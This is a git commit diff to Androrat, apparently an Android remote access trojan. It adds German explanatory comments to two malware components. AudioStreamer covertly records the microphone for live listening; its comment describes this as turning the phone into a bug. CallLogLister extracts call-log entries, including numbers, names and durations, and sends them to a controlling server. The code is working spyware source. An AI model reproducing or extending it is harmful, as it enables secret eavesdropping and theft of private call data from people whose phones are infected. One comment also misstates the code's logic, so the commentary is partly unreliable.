6e0e870bf6172af96439ef5ad3c8d634343098e1
alagai-ka <alagai_ka@web.de>
2015-06-03 15:08:46 +0200

    Comment on AudioStreamer und CallLogLister

--- src/Androrat/src/my/app/Library/AudioStreamer.java
+++ src/Androrat/src/my/app/Library/AudioStreamer.java
@@ -9,39 +9,93 @@ import android.media.AudioRecord;
 import android.media.AudioRecord.OnRecordPositionUpdateListener;
 import android.util.Log;
 
+/**
+ * Diese  Klasse implementiert den Audiostream. Hiermit wird es ermöglicht das Gerät in eine Wanze umzuwandeln
+ * und die Aufnahmen des Mikrofons live mitzuhören.
+ */
 public class AudioStreamer {
-
+	/**
+	 * Die Klasse hat verschiedene Klassenvariablen
+	 * String TAG  zur Identifizierung der Klasse
+	 */
 	public final String TAG = "AudioStreamer";
+	/**
+	 * boolean stop  Wird später zur Steuerung einer Schleife benötigt
+	 */
 	public boolean stop = false;
-	
+	/**
+	 * BlokingQueue bbq  Um die von dem Mirofon augenommenen Daten zu speicher
+	 */
 	public BlockingQueue<byte[]> bbq = new LinkedBlockingQueue<byte[]>();
-	
+	/**
+	 * frequency  Für die Frequenz mit der aufgenommen wird
+	 */
 	int frequency = 11025;
+	/**
+	 * channelConfiguration  Mono/Stereo-Autdio
+	 */
 	int channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
+	/**
+	 *audioEncoding  16Bit Audio
+	 */
 	int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
-	
+	/**
+	 * bufferSizeRecorder  Zum Festlegen der Buffergröße
+	 */
 	int bufferSizeRecorder;
 	//int bufferSizePlayer;
+	/**
+	 * Verschiedene Buffer zum Zwischenspeichern
+	 */
 	byte[] buffer;
 	byte[] buff; // pour le methode directe
+	/**
+	 * audioRecord Android Objekt zum Erhalten der Audiodaten
+	 */
 	AudioRecord audioRecord;
 	//AudioTrack audioTrack;
+	/**
+	 * threcord  Ein neuer Thread zum Aufnehmen der Audiodaten
+	 */
 	Thread threcord;
 	Context ctx;
+	/**
+	 * chan  Benötigt für die handelData Methode
+	 */
 	int chan ;
-	
+
+	/**
+	 * Der Konstruktor der Klasse. Erstellt einen neuen audioRecord
+	 * @param c Diese UpdateListener wird benachtrichtigt, sobald der Marker erreicht ist. Dies passiert jede Periode
+	 * @param source Bestimmt welche Quelle zur Audioaufnahme benutzt werden soll
+	 * @param chan Parameter für die handleData Methode
+	 */
 	public AudioStreamer(OnRecordPositionUpdateListener c, int source, int chan) {
+		/**
+		 * Die Klassenvariable wird mit dem übergebenen Parameter befüllt.
+		 */
 		this.chan = chan ;
+		/**
+		 * Diese Methode gibt die Minimalebuffergröße zurück, die benötigt wird um erfolgreich ein AudioRecordObject zu erstellen.
+		 */
 		bufferSizeRecorder = AudioRecord.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
+		/**
+		 * Hier wird ein neuer AudioRecord erstellt unter Berücksichtigung der Übergebenden und definierten Parametern.
+		 * Dieser wird dann in der KlassenVaribale audioRecord gespeichert.
+		 */
 		audioRecord = new AudioRecord(source, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);
 		//audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);
-		
+		/**
+		 * Die Periode nachdem der PostionUpdateListener benachrichtigt wird.
+		 */
 		audioRecord.setPositionNotificationPeriod(512);
 		audioRecord.setRecordPositionUpdateListener(c);
 		
 		//bufferSizePlayer = AudioTrack.getMinBufferSize(frequency, channelConfiguration, audioEncoding);
 		//audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,frequency, channelConfiguration, audioEncoding, bufferSizePlayer,	AudioTrack.MODE_STREAM);
-
+		/**
+		 * Hier wird ein neuer Thread zur späteren Audioaufnahme kreiert und in der Klassenvaribalen threcord gespeichert.
+		 */
 		threcord = new Thread(
 				new Runnable() {
 					public void run() {
@@ -51,61 +105,115 @@ public class AudioStreamer {
 
 
 	}
-	
+	/**
+	 * Startet den zuvorerstellten Thread und ruft die record-Methode auf. Zusätzlich wird hier die Variable stop auf false gesetzt.
+	 * Dies ist nötig um die Schleife in der Methode record zu aktivieren.
+	 */
 	public void run() {
 		Log.i(TAG, "Launch record thread");
 		stop = false;
 		threcord.start();
 	}
-	
+
+	/**
+	 * Die eigentliche Methode welche die Audioaufnahme durchführt.
+	 */
 	public void record() {
+		/**
+		 * Versuchen eine Audioaunahme zu starten
+		 */
 		try {
+			/**
+			 * Sollte der audioRecord nicht iniziallisiert sein so wird er gelöscht und ein Logeintrag ausgegeben.
+			 * Danach wird die Methode mit dem return-Aufruf beendet.
+			 */
 			if (audioRecord.getState() == AudioRecord.STATE_UNINITIALIZED) {
 				Log.e(TAG, "Initialisation failed !");
 				audioRecord.release();
 				audioRecord = null;
 				return;
 			}
-			
+			/**
+			 * Initialisieren des Buffers
+			 */
 			buffer = new byte[bufferSizeRecorder];
+			/**
+			 * Der Aufruf dieser Methode startet die Aufnahme.
+			 */
 			audioRecord.startRecording();
-
+			/**
+			 * Solange stop == false wird diese Schleife laufen
+			 */
 			while (!stop) {
+				/**
+				 * Liest die Audiodaten des Recorders aus.
+				 */
 				int bufferReadResult = audioRecord.read(buffer, 0, bufferSizeRecorder);
-				// soit bbq
+				/**
+				 * Neuer Byte-Buffer mit der Größe der gelesenen Daten.
+				 */
 				byte[] tmp = new byte[bufferReadResult];
+				/**
+				 * Übertragen der Daten in den Byte-Buffer
+				 */
 				System.arraycopy(buffer, 0, tmp, 0, bufferReadResult);
+				/**
+				 * Hinzufügen des Buffers zu der Queue
+				 */
 				bbq.add(tmp);
 				// soit direct
 				//buff = new byte[bufferReadResult];
 				//System.arraycopy(buffer, 0, buff, 0, bufferReadResult);
 
 			}
-
+			/**
+			 * Beenden der Audioaufnahme
+			 */
 			audioRecord.stop();
 
 		} catch (Throwable t) {
+			/**
+			 * Logeintrag falls Audioaufnahme nicht gestartet werden konnte
+			 */
 			Log.e("AudioRecord", "Recording Failed");
 		}
 		
 	}
-	
+
+	/**
+	 * Methode die die Daten die in der Queue gespeichert sind zurückliefert
+	 * @return  Die Queue,falls Daten in ihr gespeicher sind ansonsten null
+	 */
 	public byte[] getData() {
 		//return buff;
 		//ou 
 		try {
+			/**
+			 * Wenn bbq nicht leer ist, wird die Methode take aufgerufen, die den Head der Queue zurückliefert,
+			 * jedoch wartet falls das Element noch nicht Verfügbar ist.
+			 */
 			if(!bbq.isEmpty()) {
 				return bbq.take();
 			}
 		} catch (InterruptedException e) {
 		}
+		/**
+		 * Sonst gibt sie null zurück
+		 */
 		return null;
 	}
-	
+
+	/**
+	 * Setzt die stop-Varibale auf true und beendet somit die while-Schleife der Methode-record
+	 */
 	public void stop() {
 		stop = true;
 	}
-	
+
+	/**
+	 * Gibt die Variable chan zurück.
+	 * @return Der Channel für die Datenübertragung.
+	 */
 	public int getChannel() {
 		return chan;
 	}
--- src/Androrat/src/my/app/Library/CallLogLister.java
+++ src/Androrat/src/my/app/Library/CallLogLister.java
@@ -9,24 +9,58 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.provider.CallLog;
 
+/**
+ * Diese Klasse wird dazu benötigt die Anruflisten auszulesen.
+ */
 public class CallLogLister {
 
-	
+	/**
+	 * Diese Methode liest die Anruflisten aus und speichert sie in einem Array, dass dann an den Server gesendet wird.
+	 * @param c	Das Client-Objekt welches diese Methode aufgerufen hat
+	 * @param channel Der Kanal zur Datenübertragung
+	 * @param args	Hierbei handelt es sich um eine Filter für die SQL-Abfrage. Es ist die Where-Bedingung
+	 * @return true wenn Anruflisten vorhanden, falls sonst
+	 */
 	public static boolean listCallLog(ClientListener c, int channel, byte[] args) {
+		/**
+		 * ArrayList l  In dieser ArrayList werden die Daten der Anrufliste gespeichert.
+		 * Wurde die Liste erfolreich ausgelesen so wird es an den Server übermittelt.
+		 */
 		ArrayList<CallPacket> l = new ArrayList<CallPacket>();
-		
+		/**
+		 * Dies ist die return Varibale, die angibt ob es eine Anrufliste gab oder nicht.
+		 */
 		boolean ret =false;
+		/**
+		 * Das args-Array wird hier in der Variablen WHERE_CONDITION gespeichert.
+		 * Es handelt sich hierbei um den Filter den der Benutzer einstellen kann.
+		 * Es werden dann nur die Anrufe der Liste entnommen, auf welche die Bedingung zutrifft.
+		 */
 		String WHERE_CONDITION = new String(args);
+		/**
+		 * Die Ordnung nach der Sortiert wurde. In diesem Fall werden die Einträge absteigend sortiert.
+		 */
 		String SORT_ORDER = "date DESC";
+		/**
+		 * Alles Spalten die aus denen die Daten ausgelesen werden sollen.
+		 */
 		String[] column = { "_id", "type", "date", "duration", "number","name" ,"raw_contact_id" };
-		
+		/**
+		 * Der Contentresolver kann auf die Daten zugreifen. Es handelt sich hierbei um eine Art SQL-Aufruf.
+		 * Das Ergebnis wird in der Variablen cursor gespeicehrt
+		 */
 		Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, column , WHERE_CONDITION, null, SORT_ORDER);
-		
-		
+
+		/**
+		 * Sollte der cursor nicht leer sein, so wird der cursor auf das erste Element gesetzt.
+		 */
         if(cursor.getCount() != 0) {
 	        cursor.moveToFirst();
-	
 	        do{
+				/**
+				 * Wenn an der Stelle auch die Spalten vorhanden sind bzw. diese Anzahl der Spalten nicht null ist,
+				 * wird der Inhalt der verschiedenen Spalten in Variablen zwischen gespeichert.
+				 */
 	           if(cursor.getColumnCount() != 0) {
 	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
 	        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
@@ -35,18 +69,36 @@ public class CallLogLister {
 	        	   String number  = cursor.getString(cursor.getColumnIndex("number"));
 	        	   String name = cursor.getString(cursor.getColumnIndex("name"));
 	        	   int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
-	        	   
+				   /**
+					* Am Ende wird ein neues CallPacket erstellt, mit den gerade erhaltenen Daten und dies der List l angehängt.
+					*/
 	        	   l.add(new CallPacket(id, type, date, duration, raw_contact_id, number, name));
 	           }
-	        }while(cursor.moveToNext());
+	        }
+			/**
+			 * Dies wird solange getan bist es kein nächtes Element mehr gibt.
+			 */
+			while(cursor.moveToNext());
+			/**
+			 * Soblad die Liste 2 Elemente enthält wird die Variable ret auf true gesetzt.
+			 */
 	        ret = true;
         }
         else
+		/**
+		 * Sollte der cursor zu wenig Elemente enthalten so wird ret auf false gesetzt.
+		 */
         	ret = false;
-		
-		
-		
+
+
+		/**
+		 * Mit Hilfe diesem aufruf werden die Daten an den Server geschickt.
+		 * Hierzu muss jedoch erst ain CallLogPacket erstellt werden.
+		 */
 		c.handleData(channel, new CallLogPacket(l).build());
+		/**
+		 * return ret
+		 */
 		return ret;
 	}
 	
